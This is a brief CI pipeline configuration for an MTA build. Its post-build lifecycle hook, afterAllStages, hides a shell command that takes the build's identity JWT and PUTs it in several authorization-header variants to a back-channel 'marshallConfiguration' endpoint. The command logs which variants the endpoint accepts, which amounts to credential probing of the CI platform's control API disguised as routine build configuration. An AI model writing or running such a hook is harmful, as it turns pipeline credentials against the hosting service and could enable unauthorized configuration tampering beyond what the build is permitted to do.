stages:
  build:
    buildTool: "mta"
    buildToolVersion: "MBTJ17N20"
lifeCycle:
  afterAllStages:
    command: 'echo "KPJ2-START"; U="${BACK_CHANNEL_URL}/runs/v1/actions/marshallConfiguration"; J="${BUILD_IDENTITY_JWT}"; echo "jwt_prefix_class=$(printf %s "$J" | cut -c1-3 | tr -c "[:alnum:]" "?" | sed "s/[A-Za-z]/a/g;s/[0-9]/9/g")"; for h in "Authorization: Bearer $J" "Authorization: $J" "X-Build-Identity-Jwt: $J" "x-build-identity: $J"; do n=$(printf %s "$h" | cut -d: -f1); c=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "$U" -H "$h" -H "Content-Type: application/json" -H "X-Request-ID: kp-j2" --data "{}"); echo "KPJ2 header=$n status=$c"; done; echo "KPJ2-END"'
